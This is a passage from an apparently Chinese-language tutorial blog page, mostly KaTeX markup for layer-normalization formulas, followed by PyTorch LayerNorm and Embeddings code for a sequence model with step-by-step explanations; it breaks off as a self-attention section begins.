\\\\\n&amp;&amp;\\hat{x}_{i}=\\frac{x_{i}-\\mu}{\\sqrt{\\sigma^{2}+\\epsilon}} \\\\\n&amp;其中,\\epsilon 是一个小常数,用于防止除以零。 \\\\\n&amp;\\text{4}\\text{缩放和平移:} \\\\\n&amp;&amp;y_{i}=\\gamma\\hat{x}_{i}+\\beta \\\\\n&amp;其中,\\gamma 和\\beta 是可学习的参数,分别用于缩放和平移。\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:19.80234em;vertical-align:-9.65117em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:10.15117em;\"><span style=\"top:-13.139506em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span><span style=\"top:-10.65117em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span><span style=\"top:-8.233501em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span><span style=\"top:-5.745165em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.327496em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.4071659999999997em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.6628340000000001em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span><span style=\"top:2.162834em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span><span style=\"top:3.662834em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span><span style=\"top:5.162834em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:9.65117em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:10.15117em;\"><span style=\"top:-13.139506em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">1.</span><span class=\"mord cjk_fallback\">计算均值</span><span class=\"mord\">:</span></span></span></span><span style=\"top:-10.65117em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:-8.233501em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">2. </span><span class=\"mord cjk_fallback\">计算方差</span><span class=\"mord\">:</span></span></span></span><span style=\"top:-5.745165em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:-3.327496em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">3. </span><span class=\"mord cjk_fallback\">归一化</span><span class=\"mord\">:</span></span></span></span><span style=\"top:-1.4071659999999997em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:0.6628340000000001em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord cjk_fallback\">其</span><span class=\"mord cjk_fallback\">中</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">ϵ</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">小</span><span class=\"mord cjk_fallback\">常</span><span class=\"mord cjk_fallback\">数</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">用</span><span class=\"mord cjk_fallback\">于</span><span class=\"mord cjk_fallback\">防</span><span class=\"mord cjk_fallback\">止</span><span class=\"mord cjk_fallback\">除</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">零</span><span class=\"mord cjk_fallback\">。</span></span></span><span style=\"top:2.162834em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">4</span></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">缩放和平移</span><span class=\"mord\">:</span></span></span></span><span style=\"top:3.662834em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:5.162834em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord cjk_fallback\">其</span><span class=\"mord cjk_fallback\">中</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05556em;\">γ</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">学</span><span class=\"mord cjk_fallback\">习</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">分</span><span class=\"mord cjk_fallback\">别</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord cjk_fallback\">于</span><span class=\"mord cjk_fallback\">缩</span><span class=\"mord cjk_fallback\">放</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord cjk_fallback\">平</span><span class=\"mord cjk_fallback\">移</span><span class=\"mord cjk_fallback\">。</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:9.65117em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:8.65117em;\"><span style=\"top:-10.65117em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">μ</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.32144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.686em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8283360000000002em;\"><span style=\"top:-1.872331em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3000050000000005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.277669em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.745165em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.32144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.686em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8283360000000002em;\"><span style=\"top:-1.872331em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3000050000000005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.277669em;\"><span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">μ</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-1.4071659999999997em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span></span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.22222em;\"><span class=\"mord\">^</span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2603300000000002em;\"><span style=\"top:-2.196611em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.913389em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\" style=\"padding-left:0.833em;\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.740108em;\"><span style=\"top:-2.9890000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">ϵ</span></span></span><span style=\"top:-2.873389em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail\" style=\"min-width:0.853em;height:1.08em;\"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.12661100000000003em;\"><span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">μ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.93em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span><span style=\"top:3.662834em;\"><span class=\"pstrut\" style=\"height:3.828336em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05556em;\">γ</span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.69444em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span></span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.22222em;\"><span class=\"mord\">^</span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:8.15117em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">LayerNorm</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, hidden_size, eps=<span class=\"number\">1e-12</span></span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;Construct a layernorm module in the TF style (epsilon inside the square root).</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"built_in\">super</span>(LayerNorm, self).__init__()</span><br><span class=\"line\">        self.weight = nn.Parameter(torch.ones(hidden_size))</span><br><span class=\"line\">        self.bias = nn.Parameter(torch.zeros(hidden_size))</span><br><span class=\"line\">        self.variance_epsilon = eps</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        u = x.mean(-<span class=\"number\">1</span>, keepdim=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        s = (x - u).<span class=\"built_in\">pow</span>(<span class=\"number\">2</span>).mean(-<span class=\"number\">1</span>, keepdim=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        x = (x - u) / torch.sqrt(s + self.variance_epsilon)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.weight * x + self.bias</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li><strong>前向传播函数  <code>forward</code> </strong>:\n<ul>\n<li><code>u = x.mean(-1, keepdim=True)</code> ：计算输入  <code>x</code>  在最后一个维度上的均值  <code>u</code> 。</li>\n<li><code>s = (x - u).pow(2).mean(-1, keepdim=True)</code> ：计算输入  <code>x</code>  在最后一个维度上的方差  <code>s</code> 。</li>\n<li><code>x = (x - u) / torch.sqrt(s + self.variance_epsilon)</code> ：对输入  <code>x</code>  进行归一化。</li>\n<li><code>return self.weight * x + self.bias</code> ：应用缩放和偏移参数。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"嵌入层-2\"><a class=\"anchor\" href=\"#嵌入层-2\">#</a> 嵌入层</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Embeddings</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Construct the embeddings from item, position.</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, args</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(Embeddings, self).__init__()</span><br><span class=\"line\"></span><br><span class=\"line\">        self.item_embeddings = nn.Embedding(args.item_size, args.hidden_size, padding_idx=<span class=\"number\">0</span>) <span class=\"comment\"># 不要乱用padding_idx</span></span><br><span class=\"line\">        self.position_embeddings = nn.Embedding(args.max_seq_length, args.hidden_size)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.LayerNorm = LayerNorm(args.hidden_size, eps=<span class=\"number\">1e-12</span>)</span><br><span class=\"line\">        self.dropout = nn.Dropout(args.hidden_dropout_prob)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.args = args</span><br></pre></td></tr></table></figure></p>\n<p><strong>项目嵌入层  <code>self.item_embeddings</code> </strong>：</p>\n<ul>\n<li>使用  <code>nn.Embedding</code>  创建一个嵌入层，用于将项目 ID 映射到高维向量表示。</li>\n<li><code>args.item_size</code> ：项目的总数。</li>\n<li><code>args.hidden_size</code> ：每个嵌入向量的维度。</li>\n<li><code>padding_idx=0</code> ：指定填充索引为 0，以便模型可以忽略填充值。</li>\n</ul>\n<p><strong>位置嵌入层  <code>self.position_embeddings</code> </strong>：</p>\n<ul>\n<li>使用  <code>nn.Embedding</code>  创建一个嵌入层，用于将位置 ID 映射到高维向量表示。</li>\n<li><code>args.max_seq_length</code> ：序列的最大长度。</li>\n<li><code>args.hidden_size</code> ：每个嵌入向量的维度。</li>\n</ul>\n<p><strong>层归一化  <code>self.LayerNorm</code> </strong>：</p>\n<ul>\n<li>使用自定义的  <code>LayerNorm</code>  类对嵌入进行标准化，以提高训练的稳定性。</li>\n</ul>\n<p><strong>丢弃层  <code>self.dropout</code> </strong>：</p>\n<ul>\n<li>使用  <code>nn.Dropout</code>  对嵌入进行随机丢弃，以防止过拟合。</li>\n<li><code>args.hidden_dropout_prob</code> ：丢弃的概率。</li>\n</ul>\n<p><strong>参数  <code>self.args</code> </strong>：</p>\n<ul>\n<li>保存传入的参数  <code>args</code> 。</li>\n</ul>\n<h4 id=\"前向传播函数-forward\"><a class=\"anchor\" href=\"#前向传播函数-forward\">#</a> 前向传播函数  <code>forward</code></h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, input_ids</span>):</span><br><span class=\"line\">    seq_length = input_ids.size(<span class=\"number\">1</span>)</span><br><span class=\"line\">    position_ids = torch.arange(seq_length, dtype=torch.long, device=input_ids.device)</span><br><span class=\"line\">    position_ids = position_ids.unsqueeze(<span class=\"number\">0</span>).expand_as(input_ids)</span><br><span class=\"line\">    items_embeddings = self.item_embeddings(input_ids)</span><br><span class=\"line\">    position_embeddings = self.position_embeddings(position_ids)</span><br><span class=\"line\">    embeddings = items_embeddings + position_embeddings</span><br><span class=\"line\">    <span class=\"comment\"># 修改属性</span></span><br><span class=\"line\">    embeddings = self.LayerNorm(embeddings)</span><br><span class=\"line\">    embeddings = self.dropout(embeddings)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> embeddings</span><br></pre></td></tr></table></figure></p>\n<p>该函数定义了输入通过嵌入层时的计算流程。</p>\n<ol>\n<li><strong>计算序列长度  <code>seq_length</code> </strong>：\n<ul>\n<li><code>input_ids.size(1)</code>  获取输入序列的长度。</li>\n</ul>\n</li>\n<li><strong>生成位置 ID  <code>position_ids</code> </strong>：\n<ul>\n<li><code>torch.arange(seq_length, dtype=torch.long, device=input_ids.device)</code>  创建一个从 0 到  <code>seq_length-1</code>  的位置 ID 张量。</li>\n<li><code>position_ids.unsqueeze(0).expand_as(input_ids)</code>  将位置 ID 扩展为与输入 ID 相同的形状。</li>\n</ul>\n</li>\n<li><strong>计算项目嵌入  <code>items_embeddings</code> </strong>：\n<ul>\n<li><code>self.item_embeddings(input_ids)</code>  使用项目嵌入层将输入 ID 映射到嵌入向量。</li>\n</ul>\n</li>\n<li><strong>计算位置嵌入  <code>position_embeddings</code> </strong>：\n<ul>\n<li><code>self.position_embeddings(position_ids)</code>  使用位置嵌入层将位置 ID 映射到嵌入向量。</li>\n</ul>\n</li>\n<li><strong>合并嵌入  <code>embeddings</code> </strong>：\n<ul>\n<li><code>embeddings = items_embeddings + position_embeddings</code>  将项目嵌入和位置嵌入相加，得到最终的嵌入向量。</li>\n</ul>\n</li>\n<li><strong>层归一化  <code>embeddings = self.LayerNorm(embeddings)</code> </strong>：\n<ul>\n<li>对合并后的嵌入向量进行层归一化。</li>\n</ul>\n</li>\n<li><strong>丢弃处理  <code>embeddings = self.dropout(embeddings)</code> </strong>：\n<ul>\n<li>对归一化后的嵌入向量进行随机丢弃。</li>\n</ul>\n</li>\n<li><strong>返回结果  <code>return embeddings</code> </strong>：\n<ul>\n<li>返回处理后的嵌入向量。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"自注意力层\"><a class=\"anchor\" href=\"#自注意力层\">#</a> 自注意力层</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 